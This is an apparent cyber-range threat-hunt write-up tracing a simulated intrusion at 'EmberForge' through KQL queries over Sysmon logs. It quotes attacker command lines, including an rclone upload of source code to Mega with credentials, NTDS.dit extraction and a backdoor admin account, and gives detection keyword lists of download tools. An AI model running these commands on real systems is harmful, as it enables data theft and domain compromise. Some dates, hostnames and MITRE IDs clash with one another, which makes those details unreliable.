# 🎮 Threat Hunt Report — EmberForge


<img width="1536" height="1024" alt="emberforge" src="https://github.com/user-attachments/assets/90845804-8160-42da-b9e9-60b6c11be065" />
<br>

## Summary

On January 30, 2026, unreleased source code for EmberForge Studios' upcoming title "Neon Shadows" leaked to underground forums following a multi-stage intrusion. Lead Artist Lisa Martin's workstation was compromised after she opened a malicious file delivered as a project review. Initial access escalated into full domain compromise within 3 hours: the attacker exfiltrated source code via Mega cloud storage, dumped LSASS and NTDS credentials, pivoted laterally to the server and Domain Controller, and established persistence through backdoor accounts and C2 infrastructure. The complete attack chain was traced across three hosts through Sysmon telemetry and Windows Security Event logs, documenting impact scope for legal notification and breach containment.

**🚨 Key Impact Metrics:**
- Exfiltrated Assets: C:\GameDev source code (Game engine + unreleased assets)
- Compromised Accounts: 1 local user (lmartin), 1 backdoor domain account (svc_backup)
- Affected Hosts: 3/3 in scope (workstation, server, domain controller)
- Threat Infrastructure: 1 C2 domain (sync.cloud-endpoint.net), 1 exfil endpoint (Mega storage)
- Investigation Window: 3 hours (Jan 30, 21:00 UTC — Jan 31, 00:00 UTC)

---

## 🎯 Objectives

1. Determine what data was stolen and where it was sent
2. Identify all compromised user accounts and privilege levels gained
3. Trace the complete attack chain from initial access to persistence
4. Map attacker actions to MITRE ATT&CK framework for threat intelligence
5. Establish scope for legal/breach notification and incident response priority

---

## 🏗️ Hunting Grounds

**Investigation Timeframe:** January 30, 2026, 21:00 UTC to January 31, 2026, 00:00 UTC (3 hours)
**Platform:** Microsoft Sentinel  
**Workspace:** law-cyber-range  
**Primary Data Source:** EmberforgeX_CL (Sysmon Event Log + Windows Security Events, single table)  
**Domain:** emberforge.local

**📊 Hosts in Scope:**

| Hostname | IP Address | Role | OS |
|----------|-----------|------|-----|
| EC2AMAZ-B9GHH06 | 10.1.173.145 | Workstation (Initial Access) | Windows |
| EC2AMAZ-16V3AU4 | 10.1.57.66 | Server (Lateral Movement) | Windows |
| EC2AMAZ-EEU3IA2 | 10.1.100.76 | Domain Controller | Windows |

**Investigation Methodology:** Backwards hunt — started with the damage (exfiltrated data, compromised accounts) and traced back through the attack chain to initial access point. Each question built the complete narrative of attacker actions.

---

## 📋 Hunt Overview
 
The intrusion unfolded in six phases over the 3-hour investigation window. Initial access occurred at 10:38 PM when a malicious DLL was delivered on a mounted ISO, disguised as a project review file. Lisa Martin executed the payload via rundll32, loading review.dll from the D:\ drive to bypass the Mark of the Web security control. Within minutes, the attacker injected the payload into notepad.exe and hijacked the ms-settings registry key to enable a UAC bypass through fodhelper.exe. The compromised process was then elevated to SYSTEM privilege via injection into spoolsv.exe, and update.exe established a command & control beacon to sync.cloud-endpoint.net.
 
Data collection began immediately. The attacker compressed the source code from C:\GameDev into gamedev.zip in the C:\Users\Public\ directory for staging. LSASS memory was dumped to C:\Windows\System32\lsass.dmp using direct syscalls to avoid detection, and credentials were exfiltrated via rclone to Mega cloud storage under the account jwilson.vhr@proton.me. During this same period, the attacker enumerated the domain structure, identifying domain users with net user /domain, enumerating the Domain Admins group, and locating the Domain Controller via nltest /dclist. A network share was created (net share tools=C:\Users\Public) to serve as a staging point for lateral movement tools, and a firewall rule was added to permit SMB traffic.
 
By 10:41 PM, the server at 10.1.57.66 was compromised. The update.exe binary was copied to the server via the admin share (\\10.1.57.66\C$), and remote execution was established through service creation (pGJLIKnC service). The attacker enumerated server resources and prepared for the final objective: attacking the Domain Controller.
 
The Domain Controller compromise began at 10:37 PM with the same remote execution pattern. A VSS shadow copy was created to access the normally locked NTDS database, which was then extracted via a copy command to a temporary staging file. The attacker created a backdoor account named svc_backup with the password P@ssw0rd123! and granted it Domain Admin privileges, establishing persistence that would survive credential resets and provide long-term access to the entire domain.
 
---


## 🗺️ MITRE ATT&CK Techniques

| Tactic | Technique ID | Technique Name | Description |
|--------|-------------|----------------|-------------|
| 🚀 Initial Access | T1566.002 | Phishing: Spearphishing Attachment | Malicious DLL disguised as project review file |
| ⚡ Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | Compress-Archive for data packaging |
| ⚡ Execution | T1129 | Shared Module Injection | rundll32 execution of malicious DLL (review.dll) |
| ⚡ Execution | T1106 | Native API | Direct syscalls for LSASS memory dump |
| 🔐 Persistence | T1098.002 | Account Manipulation | Added svc_backup account to Domain Admins group |
| 🔐 Persistence | T1547.015 | Boot or Logon Initialization Scripts | Backdoor account for persistent future access |
| 🔓 Privilege Escalation | T1548.002 | Abuse Elevation Control Mechanism | UAC bypass via ms-settings registry hijacking |
| 🔓 Privilege Escalation | T1134.003 | Process Injection | Injected into notepad.exe and spoolsv.exe |
| 🎭 Defense Evasion | T1140 | Deobfuscation/Decode Files | Mounted ISO to bypass Mark of the Web |
| 🎭 Defense Evasion | T1027 | Obfuscated Files or Information | Random service names (pGJLIKnC, MzLbIBFm, QjhJMWqS) |
| 🎭 Defense Evasion | T1562.001 | Impair Defenses | Added firewall rule to permit SMB traffic |
| 🔑 Credential Access | T1110.004 | Brute Force: Credential Stuffing | Password spray via NTLM (failed logons on server) |
| 🔑 Credential Access | T1003.003 | Credential Dumping: NTDS | Extracted NTDS.dit via VSS shadow copy |
| 🔑 Credential Access | T1003.001 | Credential Dumping: LSASS | Dumped LSASS memory to lsass.dmp file |
| 🔎 Discovery | T1087.002 | Account Discovery | net user /domain enumeration |
| 🔎 Discovery | T1087.002 | Account Discovery | net group "Domain Admins" /domain enumeration |
| 🔎 Discovery | T1518 | Software Discovery | nltest /dclist to locate domain controller |
| 🔎 Discovery | T1057 | Process Discovery | tasklist enumeration on target systems |
| ➡️ Lateral Movement | T1570 | Lateral Tool Transfer | Copied rclone and update.exe via admin share |
| ➡️ Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Leveraged C$ admin shares for tool deployment |
| 📤 Exfiltration | T1020.001 | Data Transfer Over Alternative Protocol | rclone to Mega cloud storage (mega.nz) |
| 📤 Exfiltration | T1030 | Data Transfer Size Limits | Exfiltrated in single gamedev.zip archive |
| 📡 Command & Control | T1071.001 | Application Layer Protocol: Web Protocols | DNS queries to C2 domain (sync.cloud-endpoint.net) |
| 📡 Command & Control | T1568.003 | Dynamic Resolution: Domain Generation Algorithms | DNS-based C2 communication |

---

## 🔗 Cyber Kill Chain
 
| Stage | Description | Evidence |
|-------|-------------|----------|
| 1️⃣ Reconnaissance | Attacker identified EmberForge Studios and Lisa Martin as target via LinkedIn OSINT | LinkedIn photo leak of workstation with Azure VM details |
| 2️⃣ Weaponization | Malicious DLL payload created and packaged on ISO image | review.dll binary, mounted disk delivery mechanism |
| 3️⃣ Delivery | ISO file delivered to Lisa Martin disguised as project review document | File creation at 10:38 PM, named to appear legitimate |
| 4️⃣ Exploitation | Payload executed via rundll32, exploiting trust in legitimate Windows utilities | rundll32.exe D:\review.dll,StartW process execution |
| 5️⃣ Installation | Malicious code injected into notepad.exe for persistence and hiding | CreateRemoteThread event into notepad.exe process |
| 6️⃣ Command & Control | Beacon established to external C2 infrastructure | DNS queries to sync.cloud-endpoint.net, C2 IP 104.21.30.237 |
| 7️⃣ Actions on Objectives | Data theft, credential dumping, lateral movement, persistence | gamedev.zip exfiltration, LSASS/NTDS dumps, backdoor account creation |
 
---
 
## 🚨 Indicators of Compromise
 
**File Hashes & Artifacts:**
- review.dll (malicious DLL from D:\ mount)
- gamedev.zip (compressed source code, C:\Users\Public\)
- lsass.dmp (credential dump, C:\Windows\System32\)
- nyMdRNSp.tmp (NTDS dump staging file, C:\Windows\Temp\)

**Process Execution Chains:**
- explorer.exe → rundll32.exe → notepad.exe (process injection)
- cmd.exe → fodhelper.exe (UAC bypass)
- cmd.exe → rclone.exe (data exfiltration)
- rundll32.exe → spoolsv.exe (privilege escalation injection)
- vssadmin.exe → ntds.dit extraction

**Network Indicators:**
- C2 Domain: sync.cloud-endpoint.net (104.21.30.237)
- C2 Port: 443 (HTTPS)
- Exfil Service: mega.nz
- Exfil Account: jwilson.vhr@proton.me
- Staging IP: 10.1.57.66 (server)
- DC IP: 10.1.100.76

**Registry Modifications:**
- HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU — suspicious entries
- HKLM\Software\Microsoft\Windows\CurrentVersion\Run — potential persistence keys
- HKLM\Software\Classes\ms-settings\shell\open\command — UAC bypass hijack

**User & Account Indicators:**
- Backdoor Account: svc_backup (Domain Admin privilege)
- Compromised Local Account: lmartin
- Suspicious Failed Logons: NTLM brute force from 10.1.173.145 → 10.1.57.66
- Domain Admin Enumeration: net group "Domain Admins" /domain queries

**Service Creation Indicators:**
- Random service names: pGJLIKnC, MzLbIBFm, QjhJMWqS
- Service executable paths: C:\Windows\Temp\*.bat files
- Service execution parent: services.exe

---


# 🚩 Flag Analysis & Hunting Methodology
 
## ⚙️ Phase 1: What was the damage?
 
<details>
<summary>Q01 — Target Directory</summary>
 
**Goal:** Identify the source directory the attacker compressed before exfiltration.
 
**Approach:** The attacker packaged data before stealing it, so compression commands in the logs point straight to the target. Searched for common compression tools across the investigation window, starting broad and narrowing by tool name.
 
Initial searches for `rar`, `7z`, and `zip` using `has_any` returned nothing — a `has_any` gotcha, since it matches whole tokens and some of those terms were embedded inside longer strings. Switching to `Compress-Archive` (PowerShell's built-in cmdlet) landed the hit.
 
```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10)
| where TimeGenerated <= datetime(2026-02-11)
| where Computer has_any ("EC2AMAZ-16V3AU4")
| where CommandLine_s has_any ("tar", "compress", "archive", "Compress-Archive")
| project TimeGenerated, Channel_s, CommandLine_s
```
 
Two rows came back on the server (EC2AMAZ-16V3AU4) at 10:38:27 PM, both logging the same command:
 
<img width="1016" height="165" alt="image" src="https://github.com/user-attachments/assets/8dd87601-5912-431b-bbc6-38e8c80fe48c" />
<br>
 
The `-Path` argument is the source — `C:\GameDev`. The `-DestinationPath` staged the archive in `C:\Users\Public\`, a world-writable directory, ready for exfiltration.
 
**Flag:** `C:\GameDev`
 
> **Lesson:** `has_any` in KQL matches whole tokens, not substrings. If your search term might appear embedded inside a path or argument (like `7z` inside a filename), use `contains` or `has` on individual values instead. Also worth noting: when the flag format says "full path," they want just the clean directory — no flags, no destination arguments, no quotes.
 
</details>

<details>
<summary>Q02 — Exfil Destination</summary>
 
**Goal:** Identify the cloud service that received the stolen data.
 
**Approach:** The exfiltration tool and its configuration reveal the destination. From Q01, we know the data was compressed to gamedev.zip. Now find what tool uploaded it and where. Searched for cloud storage tools and rclone specifically, since it's a common choice for bulk exfiltration.
 
```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10)
| where TimeGenerated <= datetime(2026-02-11)
| where CommandLine_s has_any ("rclone", "aws", "gsutil", "az storage", "mega", "dropbox", "curl", "gamedev.zip")
```
 
Multiple rclone commands fired on the server at 10:38:53 AM. The configuration revealed the cloud destination and account:
 
<img width="1701" height="60" alt="image" src="https://github.com/user-attachments/assets/36eb2e74-9495-46da-a275-ec5423308cf8" />
<br>
 
The `mega:exfil` remote points to **Mega** cloud storage (mega.nz). The account credentials were embedded in the command line.
 
**Flag:** `Mega`
 
> **Lesson:** Cloud exfiltration tools leak their configuration in command lines — the service name, remote path, and credentials are all visible in the logs. Rclone specifically uses colon-separated remote notation (service:path). When hunting exfil, search for common tools and parse their arguments to extract both destination and account information.
 
</details>

<details>
<summary>Q03 — Attacker Attribution</summary>

**Goal:** Identify the email account used to authenticate to the cloud storage service.

**Approach:** The exfiltration command from Q02 contained login credentials visible in plaintext. The attacker configured rclone with an email and password for Mega authentication. Extract the email directly from the command line arguments.

From the Q02 rclone command:

```
rclone.exe --config C:\Users\Public\rclone.conf copy C:\GameDev mega:exfil --mega-user jwilson.vhr@proton.me --mega-pass Summer2024! -v
```

The `--mega-user` parameter contains the authentication email: **jwilson.vhr@proton.me**

This email serves as the attacker's persistent identifier across the exfiltration infrastructure. The domain proton.me indicates use of ProtonMail for anonymity, and the username "jwilson" is a reference to the attacker's real or operational identity.

**Flag:** `jwilson.vhr@proton.me`

> **Lesson:** Credentials in command lines are the easiest IOCs to extract. Exfiltration tools require authentication, and that authentication is logged verbatim in process execution events. Always parse tool arguments for `--user`, `--password`, `-u`, `-p`, and similar flags. The email or username becomes an attribution anchor for linking attacker infrastructure across multiple incidents.

</details>

<details>
<summary>Q04 — Domain Compromise Evidence</summary>

**Goal:** Identify the specific file that proves the attacker accessed the Domain Controller's credential database.

**Approach:** This question requires finding evidence of NTDS.dit extraction. The attacker used vssadmin to create a volume shadow copy of the locked database, then copied it to a temporary location. Search the Domain Controller logs for vssadmin commands followed by copy operations targeting the shadow copy path.

```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10)
| where TimeGenerated <= datetime(2026-02-11)
| where Computer has_any ("EEU3IA2")
| where CommandLine_s has_any ("ntds")
| project TimeGenerated, CommandLine_s
```

The DC logs showed:

<img width="1084" height="61" alt="image" src="https://github.com/user-attachments/assets/2009173d-d2e6-43e5-bb3b-0061ef76a677" />
<br>

The attacker created a VSS shadow copy (vssadmin create shadow /For=C:) to bypass the file lock on ntds.dit, then copied the entire Active Directory credential database from the shadow copy to a temporary staging file. This single file contains every domain user's password hash.

**Flag:** `ntds.dit`

> **Lesson:** NTDS.dit is the crown jewel of domain compromise. It's locked while the Domain Controller is running, but VSS shadow copies bypass this protection. The extraction pattern is distinctive: vssadmin creates the copy, then a copy command reads from \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy* path. When you see this pattern, you're looking at a domain-wide credential theft in progress.

</details>

## 🔓 Phase 2: How did data leave?

<details>
<summary>Q05 — Exfil Tool</summary>

**Goal:** Identify the tool used to exfiltrate the stolen data.

**Approach:** No additional query needed. The exfil tool was already visible in the Q02 results. The rclone command captured on the server showed the full binary path and execution context.

From the Q02 rclone command:

```
C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\GameDev mega:exfil --mega-user jwilson.vhr@proton.me --mega-pass Summer2024! -v
```

The binary is `rclone.exe`, staged by the attacker in `C:\Users\Public\` — a world-writable directory that requires no elevated privileges to write to.

**Flag:** `rclone.exe`

> **Lesson:** Attackers favor C:\Users\Public\ as a staging directory because any user or process can write there without triggering UAC. When hunting for attacker-dropped tools, always check Public alongside Temp directories. Rclone is a legitimate open-source cloud sync tool, which also means it won't trigger AV on signature alone — defenders need behavioral detection (unusual process making outbound connections to cloud storage) rather than relying on file reputation.

</details>

<details>
<summary>Q06 — Exfil Destination IP</summary>

**Goal:** Identify the IP address that received the exfiltrated data.

**Approach:** From Q02, rclone was the exfil tool. Sysmon Event ID 3 logs network connections and includes the destination IP. Filter to rclone's process image and pull the destination IP from those connection events.

```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10)
| where TimeGenerated <= datetime(2026-02-11)
| where EventID_s == 3
| where Image_s has "rclone"
| project TimeGenerated, Image_s, DestinationIp_s, DestinationPort_s
```

The query returned rclone's outbound connection, revealing the destination IP for the Mega cloud storage upload.
<br>

<img width="766" height="106" alt="image" src="https://github.com/user-attachments/assets/2cd76921-0c2b-49e7-8c71-0765d0e8bcb4" />
<br>

**Flag:** `66.203.125.15`

> **Lesson:** Sysmon Event ID 3 (Network Connection) is the fastest path to exfil destination IPs. Once you know the tool, pivot directly to its network activity — you get the destination IP, port, and timestamp in one query without needing to parse command line arguments.

</details>

<details>
<summary>Q07 — Attacker Credential Exposure</summary>

**Goal:** Identify the password used to authenticate to the cloud storage exfiltration account.

**Approach:** No additional query needed. The rclone command captured in Q02 contained both the username and password in plaintext as command line arguments. The `--mega-pass` parameter exposed the credential directly in the process execution log.

From the Q02 rclone command:

```
rclone.exe --config C:\Users\Public\rclone.conf copy C:\GameDev mega:exfil --mega-user jwilson.vhr@proton.me --mega-pass Summer2024! -v
```

**Flag:** `Summer2024!`

> **Lesson:** Attackers frequently pass credentials directly as command line arguments, trading operational security for convenience. These show up verbatim in Sysmon Event ID 1 (Process Creation) logs. A single rclone command exposed the cloud storage service, destination path, email, and password simultaneously. When you find an exfil tool in the logs, always read the full argument list — credentials, config paths, and remote destinations are often right there.

</details>

<details>
<summary>Q08 — Archive Method</summary>

**Goal:** Identify the tool or command used to compress the stolen data.

**Approach:** No additional query needed. The compression command was captured in Q01. The full command line from that query showed PowerShell's built-in `Compress-Archive` cmdlet being used to package the GameDev directory:

```
powershell.exe -c "Compress-Archive -Path C:\GameDev -DestinationPath C:\Users\Public\gamedev.zip"
```

The cmdlet name is the archive method the lab is asking for.

**Flag:** `Compress-Archive`

> **Lesson:** A single well-scoped query early in the hunt can answer multiple downstream questions. The Q01 query that found the target directory also captured the full command, exposing the archive tool, source path, and destination path in one shot. When you project the full CommandLine_s field rather than just filtering on it, you get everything the attacker typed — not just confirmation that they typed something.

</details>

<details>
<summary>Q09 — Staging Server</summary>

**Goal:** Identify the external server used to download attacker tools onto the compromised host.

**Approach:** Attackers pulling tools from external infrastructure leave traces in download commands. Searched for common LOLBin and download utilities across the investigation window — certutil, Invoke-WebRequest, curl, wget, and bitsadmin are the usual suspects.

```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10)
| where TimeGenerated <= datetime(2026-02-11)
| where CommandLine_s has_any ("Invoke-WebRequest", "wget", "curl", "certutil", "bitsadmin", "downloadstring", "iwr", "http")
| project TimeGenerated, Computer, CommandLine_s
| order by TimeGenerated asc
```

The results returned a certutil command on the server pulling update.exe from an external URL:

<img width="1442" height="58" alt="image" src="https://github.com/user-attachments/assets/866a9fd6-69a0-4ef3-9316-569e2194ae26" />
<br>

The domain in the URL is the attacker's staging server.

**Flag:** `sync.cloud-endpoint.net`

> **Lesson:** certutil is one of the most abused LOLBins for file downloads. It's a legitimate Windows certificate utility that happens to support URL caching — making it a built-in download cradle that bypasses application whitelisting. When hunting lateral movement and tool staging, always include certutil in your download-command searches alongside the obvious choices like curl and wget.

</details>

## 🔓 Phase 3: Where did it all start?

<details>
<summary>Q10 — Malicious File</summary>

**Goal:** Identify the malicious file that served as the initial payload on Lisa Martin's workstation.

**Approach:** The question indicated a Windows utility was used to load a suspicious file. Started with broad process creation (EventID 1) on the workstation, filtering for known LOLBins like rundll32, mshta, and regsvr32.

Initial results came back full of Splunk forwarder noise — legitimate system processes drowning out anything suspicious. Attempted to filter them out, but the exclusion syntax was wrong. Using `!contains` with a list doesn't work in KQL — each exclusion needs its own separate `where` clause.

```kql
| where Image_s !has "splunk"
| where Image_s !has "rundll32"
```

Pivoted to searching rundll32 specifically since it appeared in the results, but CommandLine_s came back empty for those rows — a known schema quirk where the field isn't populated on some EventID 1 entries.

Tried filtering by Desktop path and common user profile directories — no results with the Computer filter applied. Dropping the Computer filter and searching for suspicious file extensions across all hosts finally surfaced the answer:

```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10)
| where TimeGenerated <= datetime(2026-02-11)
| where CommandLine_s has_any (".hta", ".lnk", ".dll", ".js", ".vbs", ".scr")
| where CommandLine_s !has "splunk"
| project TimeGenerated, Computer, Image_s, CommandLine_s
| order by TimeGenerated asc
| take 20
```

At 10:43:35 PM on the workstation (B9GHH06):

<img width="958" height="57" alt="image" src="https://github.com/user-attachments/assets/e1c73eba-3ed3-41ff-9f49-e4df5f4700b4" />
<br>

rundll32 loading a DLL named "review" from the D:\ drive. That's the payload.

**Flag:** `review.dll`

> **Lesson:** When the Computer filter returns nothing but you know the host is in scope, drop it and add the Computer column to the project instead — you'll see what hostnames are actually in the data and can adjust. Also: `!contains` doesn't accept a list of values. Each exclusion needs its own `where` clause, or use `| where not (Image_s has_any ("splunk", "rundll32"))`. The hunt for initial access always comes back to LOLBins loading files from unusual paths — a DLL called "review" on a D:\ drive has no legitimate business being there.

</details>

<details>
<summary>Q11 — Delivery Vector</summary>

**Goal:** Identify the drive letter the malicious file was loaded from.

**Approach:** No additional query needed. The answer was visible in Q10's results. The rundll32 command captured at 10:43:35 PM showed the full file path:

```
rundll32.exe D:\review.dll,StartW
```

The file loaded from the D:\ drive — not the C:\ system drive. This is significant because files on mounted ISO images bypass the Mark of the Web (MotW) security control. When a user downloads a file from the internet, Windows tags it with a Zone.Identifier alternate data stream. Executables with this tag trigger SmartScreen warnings on launch. Files on a mounted ISO have no such tag — they execute silently.

**Flag:** `D:`

> **Lesson:** ISO delivery is a well-established MotW bypass. When a user mounts a .iso file and runs something inside it, Windows treats the contents as if they came from a local disk — no internet zone tag, no SmartScreen prompt, no warning dialog. Defenders hunting this technique should look for processes loading executables or DLLs from drive letters other than C:\ (D:\, E:\, etc.) on endpoints where removable media or virtual disk mounting isn't expected.

</details>

<details>
<summary>Q12 — Compromised User</summary>

**Goal:** Identify the user account that executed the malicious file.

**Approach:** The rundll32 command loading review.dll was already in scope from Q10. Pivoted to the user context on that event by projecting the user fields alongside the command line.

```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10)
| where TimeGenerated <= datetime(2026-02-11)
| where CommandLine_s has "review.dll"
| project TimeGenerated, User_s, Caller_User_Name_s, Computer
```

The User_s field returned `lmartin` — Lisa Martin's domain account. Patient zero confirmed.
<br>

<img width="862" height="64" alt="image" src="https://github.com/user-attachments/assets/c3f04998-b32c-458c-b22a-1a0546814d92" />
<br>

**Flag:** `lmartin`

> **Lesson:** Always project user context fields alongside command line data. Knowing the process isn't enough — you need to know who owned it. In Sysmon logs, user context typically lives in User_s or SubjectUserName_s depending on the event type. When the account name surfaces, it becomes the pivot point for every downstream question: what else did this account do, what did it have access to, and when was it first compromised.

</details>

<details>
<summary>Q13 — Execution Chain</summary>

**Goal:** Identify the full process execution chain that led to the malicious payload running.

**Approach:** From Q10 we had the rundll32 command. Now needed to trace what launched it. Added ParentImage_s to the project to expose the parent process. The Computer filter continued to return nothing, so ran without it and let the Computer column surface naturally.

```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10)
| where TimeGenerated <= datetime(2026-02-11)
| where CommandLine_s has "review.dll"
| project TimeGenerated, Image_s, CommandLine_s, ParentImage_s, ParentCommandLine_s
```

The ParentImage_s field returned `C:\Windows\explorer.exe` — Lisa double-clicked the file, spawning rundll32, which loaded the DLL payload.
<br>

<img width="1193" height="65" alt="image" src="https://github.com/user-attachments/assets/109337e0-c0ee-4352-b3ab-25e420b653ea" />
<br>

**Flag:** `explorer.exe > rundll32.exe > review.dll`

> **Lesson:** explorer.exe as a parent process is the tell for user-initiated execution — it means someone double-clicked something. The full chain matters because it tells you the delivery mechanism at a glance: user interaction (explorer) spawned a LOLBin (rundll32) which loaded a malicious module (review.dll). Each link in the chain has detection value — alerting on rundll32 loading DLLs from non-system paths would have caught this at the execution stage.

</details>

<details>
<summary>Q14 — Delivery Unpacking</summary>

**Goal:** Identify the tool and extraction path used to unpack the malicious archive before the payload executed.

**Approach:** The DLL had to come from somewhere before rundll32 loaded it. A compression tool must have extracted an archive onto the workstation prior to 10:43 PM. Searched for common extraction tools first.

### Attempt 1 — Search by command line keywords

```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10)
| where TimeGenerated <= datetime(2026-02-11)
| where Computer has "B9GHH06"
| where CommandLine_s has_any ("extract", "expand", "7z", "winrar", "tar", "Expand-Archive")
| project TimeGenerated, Image_s, CommandLine_s
| order by TimeGenerated asc
```

Nothing returned. Tried again filtering by Image_s for archive tools — also nothing. The Computer filter was the culprit again, silently dropping results even with correct syntax.

### Attempt 2 — Search by image name, no computer filter

```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10)
| where TimeGenerated <= datetime(2026-02-11)
| where Image_s has_any ("7z", "winrar", "WinZip", "tar", "extract")
| project TimeGenerated, Computer, Image_s, CommandLine_s
| order by TimeGenerated asc
```

Still nothing — has_any on Image_s wasn't matching the full path format.

### Attempt 3 — Narrow time window before the DLL executed

Pivoted to a tight time window just before the rundll32 execution at 10:43:35 PM, looking at all process creation events:

```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10)
| where TimeGenerated <= datetime(2026-02-11)
| where CommandLine_s has "Users" and CommandLine_s has "lmartin"
| project TimeGenerated, Computer, Image_s, CommandLine_s
| order by TimeGenerated asc
```

First row surfaced the answer:
<img width="1446" height="62" alt="image" src="https://github.com/user-attachments/assets/446f894f-9691-41b3-adf5-cdefe86b5ef7" />
<br>

```
"C:\Program Files\7-Zip\7zG.exe" x -o"C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\" -spe -an -ai#7zMap13315:120:7zEvent17197
```

7-Zip's GUI binary (`7zG.exe`) extracting an archive into the user's Downloads folder under a directory named EmberForge_Review. The `-o` flag is 7-Zip's output directory argument — the path after it is exactly where the contents landed.

**Flag:** `7zG.exe > C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review`

> **Lesson:** When keyword and image-name filters keep returning nothing, anchor to time instead. Knowing when the payload executed (10:43:35 PM) gives you a hard ceiling — whatever extracted the archive had to run before that. A narrow time window query against all process creation events cuts through schema quirks and filter failures. The delivery chain is almost always visible in the 2—3 minutes before the first malicious execution.

</details>

## 🎯 Phase 4: What ran on the workstation?

<details>
<summary>Q15 — Dropped Payload</summary>

**Goal:** Identify the executable dropped onto the workstation after the DLL executed.

**Approach:** After rundll32 loaded review.dll, the DLL's first job was likely to drop the next stage tool. Searched for file creation events (Sysmon EventID 11) anchored to world-writable directories after the 10:43 PM execution.

Initial attempts used `EventID == 11` which returned nothing — the table uses string format (`EventID_s`) for EventID fields, not integer. Confirmed via getschema. Multiple queries filtering for .exe files in common directories also returned noise (7-Zip installer artifacts, Zone.Identifier entries). Pivoted to filtering directly on C:\Users\Public\ since rclone was already known to stage there from Q02.

```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10T22:43:00)
| where TimeGenerated <= datetime(2026-02-10T23:59:00)
| where EventID_s == 11
| where TargetFilename_s has "Users\\Public"
| project TimeGenerated, Computer, TargetFilename_s
| order by TimeGenerated asc
```

<img width="650" height="40" alt="image" src="https://github.com/user-attachments/assets/a0043213-9050-4912-bfc2-67018d23b2c7" />
<br>

One result: `C:\Users\Public\update.exe` created at 10:43:13 PM — 22 seconds before the rundll32 execution at 10:43:35 PM. The DLL dropped the next stage tool before being invoked.

**Flag:** `C:\Users\Public\update.exe`

> **Lesson:** Sysmon EventID 11 (FileCreate) is the fastest way to catch dropped payloads. When the field uses string format (`EventID_s`), integer comparisons silently fail — always verify the schema before hunting. Anchoring the search to world-writable directories (C:\Users\Public\, C:\Windows\Temp\, C:\ProgramData\) rather than scanning all file creation events cuts the noise dramatically. Attackers almost always stage tools in these directories because no elevated privileges are needed to write there.

</details>

<details>
<summary>Q16 — C2 Domain</summary>

**Goal:** Identify the command and control domain that update.exe beaconed to.

**Approach:** DNS query events (Sysmon EventID 22) capture every domain lookup made by a process. Reused the Q15 query structure and swapped the EventID filter to 22, then looked for DNS queries.

```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10T22:43:00)
| where TimeGenerated <= datetime(2026-02-10T23:59:00)
| where EventID_s == 22
| order by TimeGenerated asc
```

<img width="1096" height="42" alt="image" src="https://github.com/user-attachments/assets/489a4380-1c74-49e5-99eb-38e51766c47c" />
<br>

The results surfaced DNS lookups from update.exe to `cdn.cloud-endpoint.net` — a domain crafted to blend in with legitimate cloud infrastructure traffic.

**Flag:** `cdn.cloud-endpoint.net`

> **Lesson:** Sysmon EventID 22 (DNS Query) is one of the highest-value events for C2 detection. It ties a domain lookup directly to the process that made it — no guessing which process was responsible. Attackers frequently use domain names that mimic legitimate services (cloud-endpoint, cdn, sync, update) to blend into normal network traffic. Once you have the process name from a prior question, pivoting to its DNS activity takes one filter change.

</details>

<details>
<summary>Q17 — Primary C2 IP</summary>

**Goal:** Identify the IP address that the C2 domain resolved to.

**Approach:** The Q16 DNS query event (EventID 22) for cdn.cloud-endpoint.net contained the resolved IP in the Raw_s field. The question pointed directly to the QueryResults field in the raw XML — no additional query needed, just parsing the event data already in hand.

The Raw_s field from the EventID 22 event showed:

```
QueryResults: ::ffff:172.67.174.46;::ffff:104.21.30.237
```

Two IPs returned from the DNS resolution. The question asked for the primary C2 IP, which was the second value in the QueryResults field.

**Flag:** `104.21.30.237`

> **Lesson:** DNS query events (EventID 22) don't just log the domain — they log the resolved IPs in the QueryResults field. That's two IOCs for the price of one query: the C2 domain and its IP. When enriching threat intelligence from a hunt, always pull the QueryResults field from DNS events. The IP becomes a network-level block candidate that works even if the attacker rotates to a new domain but keeps the same infrastructure.

</details>

<details>
<summary>Q18 — Injection Chain</summary>

**Goal:** Identify the process injection chain used by the malicious DLL to hide activity in a legitimate process.

**Approach:** Sysmon EventID 8 (CreateRemoteThread) logs process injection directly — it captures the source process injecting into a target process. Searched all EventID 8 events across the investigation window.

```kql
EmberForgeX_CL
| where TimeGenerated >= datetime(2026-02-10)
| where TimeGenerated <= datetime(2026-02-11)
| where EventID_s == 8
| project TimeGenerated, Computer, SourceImage_s, TargetImage_s
| order by TimeGenerated asc
```

The first row on the workstation at 10:43:22 PM showed rundll32.exe injecting into notepad.exe — 13 seconds after the DLL loaded. The malicious DLL used rundll32 as the injection source and notepad as the cover process.
<br>

<img width="868" height="34" alt="image" src="https://github.com/user-attachments/assets/294cb97e-7329-434f-b23d-56648f1adb2a" />
<br>

**Flag:** `rundll32.exe > notepad.exe`

> **Lesson:** Sysmon EventID 8 is one of the clearest signals of process injection in the log. It logs the exact source and target, removing any guesswork. Injecting into notepad.exe is a classic technique — it's a trusted, always-present Windows process that generates no network traffic under normal circumstances, making it an ideal host for a C2 beacon. When hunting injection, always check both the source (what injected) and the target (what's now compromised) — the target process is what your C2 traffic will appear to come from.

</details>

## 🔓 Phase 5: How did they elevate?

<details>
<summary>Q19 — UAC Bypass Binary</summary>

